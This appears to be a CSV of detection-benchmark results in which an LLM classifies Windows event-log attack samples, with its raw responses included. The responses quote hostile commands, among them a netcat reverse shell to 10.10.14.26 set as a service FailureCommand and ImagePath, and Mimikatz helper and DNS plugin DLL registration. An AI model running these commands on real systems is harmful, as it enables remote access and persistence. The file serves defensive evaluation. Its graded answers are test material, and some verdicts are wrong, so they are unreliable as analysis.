# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
claude-opus-4-8,ID7045-Random service installation.evtx,easy,A,processed,YES,100.0,83.3,YES,"104, 7045",virusé.exe,"admmig, LocalSystem",,,,0.0,3.35,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 104, 7045
- Processes: virusé.exe
- Accounts: admmig, LocalSystem
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The System event log was cleared (Event ID 104) by account admmig, immediately followed by the installation of a new service (Event ID 7045) named ""bad-task"" running ""virusé.exe"" as LocalSystem with demand start. The combination of log clearing to cover tracks plus a suspiciously named service/executable installed with high privileges is a strong indicator of malicious activity."
claude-opus-4-8,ID800-4103-4104-Service abuse with Failure Command.evtx,easy,A,processed,YES,100.0,50.0,YES,"800, 4103, 4104","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\nc.exe, powershell.exe",OFFSEC\admmig,"Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447""",10.10.14.26 4447,HKLM:\System\CurrentControlSet\services\xboxgip,0.0,4.77,3.0,6.0,4.0,4,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4103, 4104
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\nc.exe, powershell.exe
- Accounts: OFFSEC\admmig
- Commands: Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447""
- Network: 10.10.14.26 4447
- Registry: HKLM:\System\CurrentControlSet\services\xboxgip

EXPLANATION:
The user OFFSEC\admmig modified the xboxgip service's FailureCommand registry value to execute netcat (C:\nc.exe) spawning a powershell.exe reverse shell to 10.10.14.26 on port 4447. This is a classic service recovery/failure-command persistence and reverse-shell technique, clearly malicious attacker behavior."
claude-opus-4-8,ID800-4103-4104-Service abuse with malicious path.evtx,easy,A,processed,YES,100.0,50.0,YES,"800, 4103, 4104","powershell.exe, C:\nc.exe",OFFSEC\admmig,"Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447""",10.10.14.26 4447,HKLM:\System\CurrentControlSet\services\xboxgip,0.0,15.12,3.0,6.0,4.0,4,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4103, 4104
- Processes: powershell.exe, C:\nc.exe
- Accounts: OFFSEC\admmig
- Commands: Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447""
- Network: 10.10.14.26 4447
- Registry: HKLM:\System\CurrentControlSet\services\xboxgip

EXPLANATION:
The user OFFSEC\admmig modified the ImagePath of the xboxgip service to point to netcat (nc.exe) executing a reverse shell with PowerShell back to 10.10.14.26 on port 4447. This is a clear service-hijack persistence and reverse-shell technique, abusing a legitimate service name to establish command-and-control. The combination of service binary path modification and an external callback confirms malicious intent."
claude-opus-4-8,ID800-4103-4104-Service creation (PowerShell).evtx,easy,B,processed,YES,100.0,62.5,YES,"800, 4104, 4103","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, virus.exe",OFFSEC\admmig,"New-Service -Name ""hackervirus"" -BinaryPathName '""virus.exe""'",,,0.0,7.84,3.8,6.0,4.0,4,17.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4104, 4103
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, virus.exe
- Accounts: OFFSEC\admmig
- Commands: New-Service -Name ""hackervirus"" -BinaryPathName '""virus.exe""'
- Network: None
- Registry: None

EXPLANATION:
The user OFFSEC\admmig used PowerShell to create a new Windows service named ""hackervirus"" pointing to a binary called ""virus.exe"", which is a classic persistence/execution technique. The suspicious naming of both the service and binary, combined with creating a service to run an arbitrary executable, strongly indicates malicious activity rather than legitimate administration."
claude-opus-4-8,ID13-WMIimplant registry crash control.evtx,easy,A,processed,YES,100.0,71.7,YES,13,"C:\Windows\system32\services.exe, C:\Windows\system32\wbem\wmiprvse.exe",,,"10.23.42.38, 10.23.42.1, 10.23.42.10, 10.23.42.11","HKLM\System\CurrentControlSet\Services\hacker23\Start, HKLM\System\CurrentControlSet\Services\hacker23\ImagePath, HKLM\System\CurrentControlSet\Control\CrashControl\DumpFile",66.7,6.10,4.3,6.0,1.3,4,15.6,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 13
- Processes: C:\Windows\system32\services.exe, C:\Windows\system32\wbem\wmiprvse.exe
- Accounts: None
- Commands: None
- Network: 10.23.42.38, 10.23.42.1, 10.23.42.10, 10.23.42.11
- Registry: HKLM\System\CurrentControlSet\Services\hacker23\Start, HKLM\System\CurrentControlSet\Services\hacker23\ImagePath, HKLM\System\CurrentControlSet\Control\CrashControl\DumpFile

EXPLANATION:
A suspicious service named ""hacker23"" was created via services.exe with an auto-start (Start=2) configuration, indicating persistence. WMI (wmiprvse.exe, T1047) was used to manipulate CrashControl registry keys and the DumpFile value was overwritten with encoded ipconfig output (decoding to host fs03vuln, IP 10.23.42.38, gateway 10.23.42.1, DNS servers 10.23.42.10/11), reflecting reconnaissance data exfiltration/staging through registry abuse. The combination of a ""hacker""-named service plus WMI-driven registry tampering carrying network reconnaissance output is clear attacker behavior."
claude-opus-4-8,ID19-20-WMI registration via PowerLurk.evtx,easy,A,processed,YES,100.0,100.0,YES,"20, 19","cmd.exe, notepad.exe",OFFSEC\admmig,"""cmd.exe /c echo %ProcessId% >> c:\\\\temp\\\\log.txt""",,,0.0,4.27,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 20, 19
- Processes: cmd.exe, notepad.exe
- Accounts: OFFSEC\admmig
- Commands: ""cmd.exe /c echo %ProcessId% >> c:\\\\temp\\\\log.txt""
- Network: None
- Registry: None

EXPLANATION:
The logs show creation of a WMI event consumer (EventID 20) paired with a WMI event filter (EventID 19) named ""Evil"", forming a WMI permanent event subscription that triggers a command-line consumer when notepad.exe starts. This filter-to-consumer binding is a classic persistence and execution technique (T1047), and the explicit ""Evil"" naming combined with a process-start trigger executing cmd.exe strongly indicates malicious activity rather than routine administration."
claude-opus-4-8,ID4688-netsh helper DLL.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688","netsh.exe, cmd.exe, mimikatz.exe",admmig,netsh  add helper  mimikatz.exe,,,0.0,4.57,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688
- Processes: netsh.exe, cmd.exe, mimikatz.exe
- Accounts: admmig
- Commands: netsh  add helper  mimikatz.exe
- Network: None
- Registry: None

EXPLANATION:
The Security log was cleared (Event 1102) by account admmig, immediately followed by execution of netsh registering mimikatz.exe as a helper DLL (Event 4688), a known credential-theft and persistence technique. The log-clearing paired with loading a known attack tool indicates deliberate anti-forensic activity combined with malicious code execution."
claude-opus-4-8,ID5136-AdminSDholder backdoor obfuscation (via localizationDisplayId).evtx,easy,B,processed,NO,100.0,50.0,YES,5136,,admmig,,"rootdc1.offsec.lan, offsec.lan",,0.0,3.91,3.0,1.0,4.0,2,10.0,C,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 5136
- Processes: None
- Accounts: admmig
- Commands: None
- Network: rootdc1.offsec.lan, offsec.lan
- Registry: None

EXPLANATION:
These events show modifications to the localizationDisplayId attribute (a benign localization value, changing between 2 and 3) on the User-Force-Change-Password Extended-Rights configuration object, performed by the administrative account admmig. The changes are paired value-added/value-deleted operations consistent with routine directory configuration updates rather than privilege abuse or password attacks. No suspicious processes, commands, or escalation chains are present in the evidence."
claude-opus-4-8,ID5136-AdminSDholder permissions changed.evtx,easy,A,processed,YES,100.0,50.0,YES,5136,,"admmig, OFFSEC",,,,0.0,5.44,3.0,5.0,4.0,2,14.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5136
- Processes: None
- Accounts: admmig, OFFSEC
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The AdminSDHolder container's nTSecurityDescriptor (CN=AdminSDHolder,CN=System,DC=offsec,DC=lan) was modified by the account admmig, and comparing the two values shows a new full-control ACE was added: (A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4230534742-2542757381-3142984815-1234). This is a classic AdminSDHolder persistence/privilege-escalation technique, since SDProp propagates this ACL to all protected privileged groups, granting SID 1234 persistent control over Domain Admins and other protected objects."
claude-opus-4-8,ID12-LSA Protect mode enabled RunAsPPL.evtx,easy,D,processed,NO,100.0,100.0,YES,"14, 12",,,,,,0.0,2.89,6.0,4.0,4.0,1,15.0,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 14, 12
- Processes: None
- Accounts: None
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
These are routine Microsoft-Windows-Wininit system events (Event IDs 14 and 12) related to ChkDsk/boot configuration reporting on a normal Windows host. There are no processes, accounts, commands, or network indicators suggesting malicious activity, and these events are normal operational system messages."
claude-opus-4-8,ID4664-symbolic link created.evtx,easy,A,processed,NO,100.0,100.0,YES,4664,,Admin,,,,0.0,2.94,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4664
- Processes: None
- Accounts: Admin
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
Event ID 4664 indicates a hard link was created for the file sysmonconf.xml by the Admin account. This is routine file system activity associated with handling a Sysmon configuration file and shows no signs of privilege escalation, suspicious commands, or network indicators."
claude-opus-4-8,ID150-Failed DLL loaded by DNS server.evtx,easy,A,processed,YES,100.0,100.0,YES,150,mimilib.dll,,,rootdc1.offsec.lan,,0.0,4.09,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 150
- Processes: mimilib.dll
- Accounts: None
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
DNS Server Event ID 150 indicates a failure loading a server-level plugin DLL, here the file .\mimilib.dll, which is a known Mimikatz component used for DNS server-side abuse and persistence on a domain controller. Loading mimilib.dll as a DNS plugin is a recognized attack technique allowing code execution within the privileged DNS service, and its repeated appearance on rootdc1 strongly indicates malicious activity rather than legitimate DNS configuration."
claude-opus-4-8,ID4688-DNS DLL serverlevelplugindll command.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\dnscmd.exe, C:\Windows\System32\cmd.exe",admmig,"dnscmd.exe  /config /serverlevelplugindll ""C:\TOOLS\Mimikatz-fev-2020\mimilib.dll""",,,0.0,3.99,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\dnscmd.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: dnscmd.exe  /config /serverlevelplugindll ""C:\TOOLS\Mimikatz-fev-2020\mimilib.dll""
- Network: None
- Registry: None

EXPLANATION:
The dnscmd.exe command registers a serverlevelplugindll pointing to mimilib.dll from a Mimikatz tooling directory, a well-known DNS server abuse technique that loads an attacker-controlled DLL into the DNS service for code execution and persistence on a domain controller. The use of a Mimikatz-named DLL and execution on a DC (rootdc1.offsec.lan) strongly indicates malicious privilege escalation/persistence activity."
claude-opus-4-8,ID770-Success DLL loaded by DNS server.evtx,easy,A,processed,YES,100.0,100.0,YES,"771, 770",C:\TOOLS\Mimikatz-fev-2020\mimilib.dll,,,rootdc1.offsec.lan,,0.0,3.67,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 771, 770
- Processes: C:\TOOLS\Mimikatz-fev-2020\mimilib.dll
- Accounts: None
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
DNS Server Event 770 indicates a DNS server plugin DLL was loaded, and the path explicitly references ""Mimikatz-fev-2020\mimilib.dll"", a known credential-theft and DNS server-level DLL hijacking component. Loading mimilib.dll into a domain controller's DNS service is a strong indicator of malicious persistence/abuse rather than routine activity."
claude-opus-4-8,ID4673-Privilege SeMachineAccountPrivilege called.evtx,easy,A,processed,NO,100.0,100.0,YES,4673,C:\Windows\System32\lsass.exe,hack1,,,,0.0,3.89,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4673
- Processes: C:\Windows\System32\lsass.exe
- Accounts: hack1
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
This is a single Event 4673 (privileged service called) showing the use of SeMachineAccountPrivilege via the Security Account Manager by lsass.exe, which is a normal system process. In isolation this represents routine machine account creation/privilege use and lacks any escalation chain, suspicious commands, or paired state changes to indicate attack behavior. The suggestive username ""hack1"" alone is insufficient evidence of malicious activity without corroborating events."
claude-opus-4-8,ID4648-4624-RunAsCS login.evtx,easy,A,processed,YES,100.0,80.0,YES,"1102, 4648, 4624, 4688","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe","admmig, test10, FS03$","/c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami",,,0.0,4.96,4.8,6.0,4.0,4,18.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4648, 4624, 4688
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe
- Accounts: admmig, test10, FS03$
- Commands: /c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami
- Network: None
- Registry: None

EXPLANATION:
The security log was cleared (Event 1102) by admmig immediately before an explicit-credential logon (4648) and Type 3 logon (4624) using the test10 account, indicating anti-forensic activity and credential-based lateral movement. The follow-on cmd.exe spawning ""whoami"" reconnaissance via PowerShell strongly matches post-exploitation behavior. The combination of log clearing, alternate-credential logon, and recon commands in rapid succession is a clear attack pattern rather than routine activity."
claude-opus-4-8,"ID4688,4624-RottenPotatoNG.evtx",easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4624","C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe","hack1, FS03VULN$, ANONYMOUS LOGON","MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff",127.0.0.1,,0.0,4.58,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4624
- Processes: C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe
- Accounts: hack1, FS03VULN$, ANONYMOUS LOGON
- Commands: MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff
- Network: 127.0.0.1
- Registry: None

EXPLANATION:
The sequence shows the security log being cleared (1102) by user hack1, immediately followed by execution of MSFRottenPotato.exe, a known token-impersonation privilege escalation tool. The subsequent ANONYMOUS LOGON via NTLM V1 from 127.0.0.1 and the spawning of cmd.exe under the SYSTEM account (S-1-5-18) confirm a successful local privilege escalation to SYSTEM combined with anti-forensic log clearing."
claude-opus-4-8,"ID4688,4648,4624-Runas execution with different user.evtx",easy,A,processed,YES,100.0,81.7,YES,"1102, 4688, 4648, 4624, 4672","C:\Windows\System32\runas.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe, C:\Windows\System32\svchost.exe","admmig, hack1, FS03$","runas  /user:offsec\hack1 cmd.exe, cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe",::1,,0.0,6.21,4.9,6.0,4.0,4,18.9,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4648, 4624, 4672
- Processes: C:\Windows\System32\runas.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, hack1, FS03$
- Commands: runas  /user:offsec\hack1 cmd.exe, cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe
- Network: ::1
- Registry: None

EXPLANATION:
The sequence begins with a Security log clear (Event 1102) by admmig, a classic anti-forensic/defense-evasion action immediately preceding suspicious activity. Shortly after, runas is used to launch cmd.exe as the account hack1, which then receives a large set of sensitive privileges (SeDebugPrivilege, SeImpersonatePrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, etc.) via Event 4672, indicating privilege escalation. The combination of log clearing followed by credential-switching to a highly privileged account is a strong indicator of malicious lateral movement/escalation rather than routine administration."
claude-opus-4-8,ID4704-4705-User righ assigned to account.evtx,easy,A,processed,YES,100.0,100.0,YES,"4704, 4705",,admmig,,,,0.0,4.48,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4704, 4705
- Processes: None
- Accounts: admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The same actor (admmig, LogonId 0x202DAC8) rapidly assigns and removes a series of sensitive privileges (SeCreateTokenPrivilege, SeAssignPrimaryTokenPrivilege, SeDebugPrivilege, SeImpersonatePrivilege) to user SID -1158, each paired with an immediate removal (4704 followed by 4705). This escalating chain of high-value token/debug/impersonation privileges granted to a single account in a short window is consistent with privilege escalation and token-manipulation tradecraft rather than routine administration."
claude-opus-4-8,ID4717-4718-System security granded to account.evtx,easy,A,processed,NO,100.0,100.0,YES,"4717, 4718",,admmig,,,,0.0,3.49,6.0,1.0,4.0,3,14.0,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4717, 4718
- Processes: None
- Accounts: admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
These paired events (4717 granting and 4718 removing SeDenyServiceLogonRight on the same TargetSid S-1-5-21-4230534742-2542757381-3142984815-1158) reflect routine user-rights policy adjustments performed by an administrative account (admmig). The right being managed is a ""deny"" logon right, and the assignment/removal pattern is consistent with normal migration or policy maintenance rather than privilege escalation or attacker activity."
